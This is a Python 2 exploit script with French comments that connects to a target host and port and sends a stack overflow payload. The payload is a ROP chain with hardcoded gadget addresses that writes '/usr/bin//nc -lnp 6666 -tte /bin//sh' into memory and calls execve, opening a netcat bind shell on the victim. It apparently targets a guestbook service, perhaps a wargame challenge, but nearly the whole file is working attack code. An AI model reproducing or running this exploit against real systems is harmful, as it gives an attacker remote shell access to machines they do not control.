#!/usr/bin/env python2

import socket
import os
import time
import sys
from struct import pack

if len(sys.argv) != 3:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

EDAX0      = pack("<I", 0x08050a88)
STACK      = pack("<I", 0x080c8110) # .data 0xba0   0x80c8080
INT80      = pack("<I", 0x0805a046) # int $0x80
MOVISTACK  = pack("<I", 0x080503a2) # mov %eax,(%ecx) | pop %ebp | ret
INCEAX     = pack("<I", 0x080823df) # inc %eax | ret
POPALL     = pack("<I", 0x08059f70) # pop %edx | pop %ecx | pop %ebx | ret
POPEAX     = pack("<I", 0x0809ae7a) # pop %eax | pop %ebx | pop %esi | pop %edi | ret
XOREAX     = pack("<I", 0x080570f4) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x42424242) # padding

buff  = "\x41" * 507


######################### execve ###########################
buff += POPALL
buff += DUMMY
buff += STACK
buff += DUMMY

buff += POPEAX
buff += "/usr"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 4)
buff += DUMMY

buff += POPEAX
buff += "/bin"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 8)
buff += DUMMY

buff += POPEAX
buff += "//nc"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 13)
buff += DUMMY

buff += POPEAX
buff += "-lnp"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 18)
buff += DUMMY

buff += POPEAX
buff += "6666"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 23)
buff += DUMMY
    
buff += POPEAX
buff += "-tte"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 28)
buff += DUMMY
    
buff += POPEAX
buff += "/bin"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 32)
buff += DUMMY
   
buff += POPEAX
buff += "//sh"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

#
# Maintenant il faut construire ce putin de char ** -_-"
#
# 0x80c8110 <guestBook+112>:  "/usr/bin//nc"
# 0x80c811d <guestBook+125>:  "-lnp"
# 0x80c8122 <guestBook+130>:  "6666"
# 0x80c8127 <guestBook+135>:  "-tte"
# 0x80c812c <guestBook+140>:  "/bin//sh"
# 0x80c8135 <guestBook+149>:  ""

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 60)
buff += DUMMY

buff += POPEAX
buff += pack("<I", 0x080c8110) # l'@ de "/usr/bin//nc"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 64)
buff += DUMMY

buff += POPEAX
buff += pack("<I", 0x080c811d) # l'@ de "-lnp"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 68)
buff += DUMMY
     
buff += POPEAX
buff += pack("<I", 0x080c8122) # l'@ de "6666"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 72)
buff += DUMMY

buff += POPEAX
buff += pack("<I", 0x080c8127) # l'@ de "-tte"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += POPALL
buff += DUMMY
buff += pack("<I", 0x080c8110 + 76)
buff += DUMMY

buff += POPEAX
buff += pack("<I", 0x080c812c) # l'@ de "/bin//sh"
buff += DUMMY
buff += DUMMY
buff += DUMMY
buff += MOVISTACK
buff += DUMMY

buff += XOREAX
buff += INCEAX * 11
buff += POPALL
buff += pack("<I", 0x080c8081 + 24) # edx
buff += pack("<I", 0x080c8110 + 60) # ecx
buff += pack("<I", 0x080c8110)      # ebx
#buff += DUMMY
buff += INT80
######################### execve ###########################

cmdID = "3 "
arg3  = " "+buff
arg2  = str(len(arg3))
payload = cmdID + arg2 + arg3 

print "[+] Send payload..."
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload"
   sys.exit(1)
print "[+] done!"

